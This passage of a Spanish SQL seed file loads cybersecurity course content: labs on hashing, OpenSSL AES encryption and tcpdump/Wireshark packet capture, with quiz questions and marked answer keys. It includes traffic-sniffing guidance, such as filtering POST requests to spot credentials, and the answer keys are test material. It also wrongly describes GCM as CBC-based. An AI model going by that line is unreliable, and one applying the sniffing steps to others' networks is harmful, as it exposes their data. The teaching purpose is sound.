-- =============================================================================
-- seed_activities.sql
-- Datos adicionales: 2 cursos nuevos, 4 módulos, 8 laboratorios, 40 preguntas,
-- 8 actividades prácticas.
-- Ejecutar en Supabase SQL Editor DESPUÉS de schema.sql y seed.sql.
-- Es idempotente: se puede volver a correr sin duplicar datos.
-- =============================================================================

-- =============================================================================
-- CURSO 2: Seguridad en Redes y Criptografía (intermedio)
-- =============================================================================

INSERT INTO courses (slug, title, description, difficulty, is_published, created_by)
SELECT
  'redes-criptografia',
  'Seguridad en Redes y Criptografía',
  'Aprende los fundamentos del cifrado, el análisis de tráfico de red y los ataques a protocolos de capa 2. Desde hashing hasta envenenamiento ARP.',
  'intermedio',
  TRUE,
  id
FROM users WHERE username = 'admin'
ON CONFLICT (slug) DO UPDATE SET
  title       = EXCLUDED.title,
  description = EXCLUDED.description,
  difficulty  = EXCLUDED.difficulty,
  is_published = EXCLUDED.is_published;

-- ── Módulo 1: Criptografía Aplicada ──────────────────────────────────────────

INSERT INTO course_modules (course_id, slug, title, description, position)
SELECT c.id, 'criptografia-aplicada',
  'Criptografía Aplicada',
  'Hashing, cifrado simétrico y asimétrico con herramientas reales de línea de comandos.',
  1
FROM courses c WHERE c.slug = 'redes-criptografia'
ON CONFLICT (course_id, slug) DO UPDATE SET
  title = EXCLUDED.title, description = EXCLUDED.description, position = EXCLUDED.position;

-- ── Lab 1: Fundamentos de Hashing ────────────────────────────────────────────

INSERT INTO laboratories (module_id, slug, title, content_markdown, position, estimated_minutes, points, is_published)
SELECT cm.id,
  'fundamentos-hashing',
  'Fundamentos de Hashing',
  E'## ¿Qué es una función hash?\n\nUna **función hash criptográfica** convierte datos de cualquier tamaño en una cadena de longitud fija llamada *digest* o *resumen*. Sus propiedades clave son:\n\n- **Determinista:** la misma entrada siempre produce la misma salida.\n- **Unidireccional:** es computacionalmente imposible obtener la entrada a partir del hash.\n- **Resistente a colisiones:** es extremadamente difícil encontrar dos entradas distintas con el mismo hash.\n- **Efecto avalancha:** un cambio mínimo en la entrada produce un hash completamente diferente.\n\n## Algoritmos más usados\n\n| Algoritmo | Bits de salida | Estado |\n|-----------|---------------|--------|\n| MD5       | 128 bits      | Roto (colisiones conocidas) |\n| SHA-1     | 160 bits      | Deprecado |\n| SHA-256   | 256 bits      | Seguro |\n| SHA-512   | 512 bits      | Seguro |\n| bcrypt    | Variable      | Recomendado para contraseñas |\n\n## Generar hashes desde la terminal\n\n```bash\necho -n "ciberseguridad" | sha256sum\n```\n\n## ¿Qué es el salt?\n\nUn **salt** es un valor aleatorio que se agrega a la contraseña antes de hashearla. Impide los ataques de *rainbow table* porque dos usuarios con la misma contraseña tendrán hashes diferentes.\n\n---\nCompleta el quiz y la actividad para ganar **150 puntos**.',
  1, 20, 150, TRUE
FROM course_modules cm WHERE cm.slug = 'criptografia-aplicada'
ON CONFLICT (module_id, slug) DO UPDATE SET
  title = EXCLUDED.title, content_markdown = EXCLUDED.content_markdown,
  position = EXCLUDED.position, estimated_minutes = EXCLUDED.estimated_minutes,
  points = EXCLUDED.points, is_published = EXCLUDED.is_published;

-- Preguntas Lab fundamentos-hashing

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 1, 'multiple_choice',
  '¿Cuántos bits produce el algoritmo SHA-256?',
  'SHA-256 pertenece a la familia SHA-2 y genera un digest de 256 bits (32 bytes). Es el estándar actual recomendado para la mayoría de aplicaciones.'
FROM laboratories l WHERE l.slug = 'fundamentos-hashing'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 2, 'multiple_choice',
  '¿Qué propiedad de las funciones hash impide obtener la entrada original a partir del hash?',
  'La propiedad unidireccional (one-way) garantiza que el proceso sea irreversible computacionalmente. No existe operación inversa eficiente.'
FROM laboratories l WHERE l.slug = 'fundamentos-hashing'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 3, 'multiple_choice',
  '¿Para qué sirve agregar un salt al hashear una contraseña?',
  'El salt evita los ataques de rainbow table: aunque dos usuarios tengan la misma contraseña, sus hashes serán distintos porque el salt es único por usuario.'
FROM laboratories l WHERE l.slug = 'fundamentos-hashing'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 4, 'multiple_choice',
  '¿Por qué MD5 ya no se considera seguro para aplicaciones criptográficas?',
  'Se han demostrado colisiones prácticas en MD5: es posible generar dos archivos diferentes con el mismo hash MD5, lo que invalida su uso en firmas digitales y verificación de integridad.'
FROM laboratories l WHERE l.slug = 'fundamentos-hashing'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 5, 'activity_response',
  'Genera el hash SHA-256 de la cadena "ciberseguridad" usando la terminal. Copia la respuesta generada.',
  'El comando echo -n evita agregar un salto de línea. sha256sum calcula el digest SHA-256 de la entrada estándar.'
FROM laboratories l WHERE l.slug = 'fundamentos-hashing'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

-- Opciones Lab fundamentos-hashing Q1
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, '256 bits', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'fundamentos-hashing' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, '128 bits', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'fundamentos-hashing' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, '512 bits', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'fundamentos-hashing' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, '160 bits', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'fundamentos-hashing' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q2
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Unidireccionalidad', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'fundamentos-hashing' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Determinismo', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'fundamentos-hashing' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Efecto avalancha', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'fundamentos-hashing' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'Resistencia a colisiones', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'fundamentos-hashing' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q3
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Evitar ataques de rainbow table haciendo únicos los hashes', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'fundamentos-hashing' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Acelerar el proceso de hashing', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'fundamentos-hashing' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Cifrar el hash resultante', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'fundamentos-hashing' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'Aumentar los bits de salida del algoritmo', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'fundamentos-hashing' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q4
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Se han encontrado colisiones prácticas', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'fundamentos-hashing' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Solo produce 64 bits de salida', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'fundamentos-hashing' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Es demasiado lento para uso práctico', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'fundamentos-hashing' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'No es determinista', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'fundamentos-hashing' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Actividad Q5
INSERT INTO question_activities (question_id, title, instructions_markdown, expected_action_key, success_feedback, is_published)
SELECT q.id,
  'Generación de hash SHA-256',
  E'## Objetivo\n\nUsa la terminal para generar el hash SHA-256 de una cadena de texto.\n\n## Instrucciones\n\n```bash\necho -n "ciberseguridad" | sha256sum\n```\n\n**Importante:**\n- El flag `-n` en `echo` evita agregar un salto de línea al final, lo que cambiaría el hash.\n- `sha256sum` lee de la entrada estándar y devuelve el digest en hexadecimal.\n\n> **Resultado esperado:** una cadena de 64 caracteres hexadecimales seguida de un guion.\n\nCopia la **respuesta generada** y úsala en el quiz.',
  'echo -n "ciberseguridad" | sha256sum',
  '¡Correcto! Has generado el hash SHA-256. Copia esta respuesta para usarla en el quiz.',
  TRUE
FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'fundamentos-hashing' AND q.question_order = 5
ON CONFLICT (question_id) DO NOTHING;

-- ── Lab 2: Cifrado Simétrico con OpenSSL ──────────────────────────────────────

INSERT INTO laboratories (module_id, slug, title, content_markdown, position, estimated_minutes, points, is_published)
SELECT cm.id,
  'cifrado-simetrico-openssl',
  'Cifrado Simétrico con OpenSSL',
  E'## Cifrado simétrico\n\nEn el **cifrado simétrico** la misma clave secreta se usa para cifrar y descifrar. Es mucho más rápido que el cifrado asimétrico y se usa para proteger grandes volúmenes de datos.\n\n## AES — Advanced Encryption Standard\n\n**AES** es el estándar de cifrado simétrico más utilizado. Admite claves de 128, 192 o 256 bits.\n\n## Modos de operación\n\n| Modo | Descripción |\n|------|-------------|\n| **ECB** | Cada bloque se cifra de forma independiente. Inseguro (muestra patrones). |\n| **CBC** | Encadena bloques usando XOR con el bloque anterior. Requiere IV. |\n| **CTR** | Convierte AES en cifrado de flujo. Paralelizable. |\n| **GCM** | CBC + autenticación integrada (AEAD). Recomendado. |\n\n## Cifrar y descifrar con OpenSSL\n\n```bash\n# Cifrar\nopenssl enc -aes-256-cbc -in secreto.txt -out secreto.enc -k "mi_clave_segura" -pbkdf2\n\n# Descifrar\nopenssl enc -d -aes-256-cbc -in secreto.enc -out secreto_recuperado.txt -k "mi_clave_segura" -pbkdf2\n```\n\nEl flag `-pbkdf2` deriva la clave usando PBKDF2, mucho más seguro que el método legacy.\n\n---\nCompleta el quiz y la actividad para ganar **250 puntos**.',
  2, 25, 250, TRUE
FROM course_modules cm WHERE cm.slug = 'criptografia-aplicada'
ON CONFLICT (module_id, slug) DO UPDATE SET
  title = EXCLUDED.title, content_markdown = EXCLUDED.content_markdown,
  position = EXCLUDED.position, estimated_minutes = EXCLUDED.estimated_minutes,
  points = EXCLUDED.points, is_published = EXCLUDED.is_published;

-- Preguntas Lab cifrado-simetrico-openssl

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 1, 'multiple_choice',
  '¿Qué característica define al cifrado simétrico?',
  'En el cifrado simétrico se usa la misma clave para cifrar y descifrar. Esto lo hace muy eficiente pero requiere un canal seguro para compartir la clave.'
FROM laboratories l WHERE l.slug = 'cifrado-simetrico-openssl'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 2, 'multiple_choice',
  '¿Por qué el modo ECB de AES se considera inseguro?',
  'ECB cifra cada bloque de forma independiente. Bloques de texto plano idénticos producen bloques cifrados idénticos, revelando patrones en los datos.'
FROM laboratories l WHERE l.slug = 'cifrado-simetrico-openssl'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 3, 'multiple_choice',
  '¿Qué longitud de clave usa AES-256?',
  'AES-256 usa una clave de 256 bits (32 bytes). Es el tamaño de clave más robusto de AES y el recomendado para datos altamente sensibles.'
FROM laboratories l WHERE l.slug = 'cifrado-simetrico-openssl'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 4, 'multiple_choice',
  '¿Qué modo de AES incluye autenticación integrada (AEAD)?',
  'GCM (Galois/Counter Mode) es un modo AEAD: cifra los datos y genera un tag de autenticación que detecta cualquier modificación del ciphertext.'
FROM laboratories l WHERE l.slug = 'cifrado-simetrico-openssl'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 5, 'activity_response',
  'Cifra el archivo secreto.txt con AES-256-CBC usando OpenSSL. Copia la respuesta generada.',
  'openssl enc -aes-256-cbc cifra con AES en modo CBC. El flag -pbkdf2 usa derivación de clave segura.'
FROM laboratories l WHERE l.slug = 'cifrado-simetrico-openssl'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

-- Opciones Q1
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'La misma clave cifra y descifra', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'cifrado-simetrico-openssl' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Usa un par de claves pública y privada', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'cifrado-simetrico-openssl' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'No requiere ninguna clave', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'cifrado-simetrico-openssl' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'La clave de cifrado es pública y la de descifrado privada', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'cifrado-simetrico-openssl' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q2
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Bloques iguales de texto plano producen bloques cifrados iguales', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'cifrado-simetrico-openssl' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'No soporta claves de 256 bits', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'cifrado-simetrico-openssl' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Es demasiado lento para uso práctico', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'cifrado-simetrico-openssl' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'No incluye vector de inicialización (IV)', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'cifrado-simetrico-openssl' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q3
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, '256 bits', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'cifrado-simetrico-openssl' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, '128 bits', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'cifrado-simetrico-openssl' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, '512 bits', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'cifrado-simetrico-openssl' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, '192 bits', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'cifrado-simetrico-openssl' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q4
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'GCM (Galois/Counter Mode)', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'cifrado-simetrico-openssl' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'CBC (Cipher Block Chaining)', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'cifrado-simetrico-openssl' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'ECB (Electronic Codebook)', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'cifrado-simetrico-openssl' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'CTR (Counter Mode)', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'cifrado-simetrico-openssl' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Actividad Q5
INSERT INTO question_activities (question_id, title, instructions_markdown, expected_action_key, success_feedback, is_published)
SELECT q.id,
  'Cifrado de archivos con OpenSSL AES-256-CBC',
  E'## Objetivo\n\nUsa OpenSSL para cifrar un archivo con AES-256 en modo CBC.\n\n## Instrucciones\n\n```bash\nopenssl enc -aes-256-cbc -in secreto.txt -out secreto.enc -k "mi_clave_segura" -pbkdf2\n```\n\n**Explicación de los flags:**\n- `-aes-256-cbc`: algoritmo AES con clave de 256 bits en modo CBC\n- `-in secreto.txt`: archivo de entrada\n- `-out secreto.enc`: archivo cifrado de salida\n- `-k "mi_clave_segura"`: contraseña para derivar la clave\n- `-pbkdf2`: usa PBKDF2 para derivar la clave de forma segura\n\nPara descifrar el resultado:\n\n```bash\nopenssl enc -d -aes-256-cbc -in secreto.enc -out recuperado.txt -k "mi_clave_segura" -pbkdf2\n```\n\nCopia la **respuesta generada** y úsala en el quiz.',
  'openssl enc -aes-256-cbc -in secreto.txt -out secreto.enc -k "mi_clave_segura" -pbkdf2',
  '¡Excelente! Has cifrado el archivo con AES-256-CBC. Copia esta respuesta para el quiz.',
  TRUE
FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'cifrado-simetrico-openssl' AND q.question_order = 5
ON CONFLICT (question_id) DO NOTHING;

-- ── Módulo 2: Análisis de Tráfico de Red ─────────────────────────────────────

INSERT INTO course_modules (course_id, slug, title, description, position)
SELECT c.id, 'analisis-trafico-red',
  'Análisis de Tráfico de Red',
  'Captura, inspección y manipulación del tráfico de red usando Wireshark, tcpdump y técnicas de envenenamiento ARP.',
  2
FROM courses c WHERE c.slug = 'redes-criptografia'
ON CONFLICT (course_id, slug) DO UPDATE SET
  title = EXCLUDED.title, description = EXCLUDED.description, position = EXCLUDED.position;

-- ── Lab 3: Wireshark y tcpdump ────────────────────────────────────────────────

INSERT INTO laboratories (module_id, slug, title, content_markdown, position, estimated_minutes, points, is_published)
SELECT cm.id,
  'wireshark-tcpdump',
  'Captura de Paquetes con Wireshark y tcpdump',
  E'## ¿Por qué capturar tráfico?\n\nLa captura de paquetes permite a un analista de seguridad:\n- Detectar comunicaciones no cifradas con datos sensibles.\n- Identificar malware que se comunica con servidores C2.\n- Depurar problemas de red.\n- Analizar protocolos desconocidos.\n\n## tcpdump — captura en terminal\n\n**tcpdump** es la herramienta de captura de paquetes de línea de comandos más universal.\n\n```bash\n# Capturar en interfaz eth0 y guardar en archivo\ntcpdump -i eth0 -w captura.pcap\n\n# Filtrar solo tráfico HTTP\ntcpdump -i eth0 port 80\n\n# Ver paquetes en tiempo real con contenido ASCII\ntcpdump -i eth0 -A port 80\n```\n\n## Wireshark — análisis visual\n\nWireshark abre los archivos `.pcap` y permite filtrarlos con su propio lenguaje:\n\n| Filtro Wireshark | Descripción |\n|------------------|-------------|\n| `http` | Solo tráfico HTTP |\n| `dns` | Solo consultas DNS |\n| `tcp.port == 443` | Solo HTTPS |\n| `ip.addr == 10.10.10.1` | Solo tráfico hacia/desde esa IP |\n| `http.request.method == POST` | Solo peticiones POST |\n\n## Modo promiscuo\n\nEn modo normal, la tarjeta de red solo acepta paquetes destinados a su MAC. En **modo promiscuo**, acepta todo el tráfico del segmento de red, lo que permite capturar tráfico de otras máquinas.\n\n---\nCompleta el quiz y la actividad para ganar **200 puntos**.',
  1, 30, 200, TRUE
FROM course_modules cm WHERE cm.slug = 'analisis-trafico-red'
ON CONFLICT (module_id, slug) DO UPDATE SET
  title = EXCLUDED.title, content_markdown = EXCLUDED.content_markdown,
  position = EXCLUDED.position, estimated_minutes = EXCLUDED.estimated_minutes,
  points = EXCLUDED.points, is_published = EXCLUDED.is_published;

-- Preguntas Lab wireshark-tcpdump

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 1, 'multiple_choice',
  '¿Qué hace el modo promiscuo en la captura de paquetes?',
  'En modo promiscuo, la interfaz de red acepta y procesa todos los paquetes del segmento, no solo los destinados a su propia dirección MAC.'
FROM laboratories l WHERE l.slug = 'wireshark-tcpdump'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 2, 'multiple_choice',
  '¿Qué formato de archivo usa tcpdump para guardar capturas de paquetes?',
  'El formato .pcap (packet capture) es el estándar de la industria. Puede ser abierto por Wireshark, tcpdump, Zeek y otras herramientas de análisis.'
FROM laboratories l WHERE l.slug = 'wireshark-tcpdump'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 3, 'multiple_choice',
  '¿Qué filtro de Wireshark muestra únicamente peticiones HTTP POST?',
  'http.request.method == "POST" es un filtro de display de Wireshark que filtra solo las peticiones POST, útil para encontrar envíos de formularios y credenciales.'
FROM laboratories l WHERE l.slug = 'wireshark-tcpdump'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 4, 'multiple_choice',
  '¿En qué capa del modelo OSI opera Wireshark principalmente?',
  'Wireshark captura a nivel de capa 2 (Enlace) y puede analizar hasta capa 7 (Aplicación), diseccionando protocolo por protocolo la pila completa.'
FROM laboratories l WHERE l.slug = 'wireshark-tcpdump'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 5, 'activity_response',
  'Captura paquetes en la interfaz eth0 durante 10 segundos y guárdalos en un archivo. Copia la respuesta generada.',
  'tcpdump -i eth0 -w captura.pcap captura todo el tráfico de la interfaz eth0 y lo guarda en formato pcap.'
FROM laboratories l WHERE l.slug = 'wireshark-tcpdump'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

-- Opciones Q1
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Captura todo el tráfico del segmento, no solo el destinado a la interfaz', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'wireshark-tcpdump' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Oculta el tráfico de red al firewall', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'wireshark-tcpdump' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Descifra automáticamente el tráfico HTTPS', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'wireshark-tcpdump' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'Aumenta la velocidad de captura', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'wireshark-tcpdump' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q2
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, '.pcap', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'wireshark-tcpdump' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, '.log', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'wireshark-tcpdump' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, '.cap', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'wireshark-tcpdump' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, '.net', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'wireshark-tcpdump' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q3
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'http.request.method == "POST"', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'wireshark-tcpdump' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'tcp.flags.post == 1', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'wireshark-tcpdump' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'http.method = POST', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'wireshark-tcpdump' AND q.question_order = 3
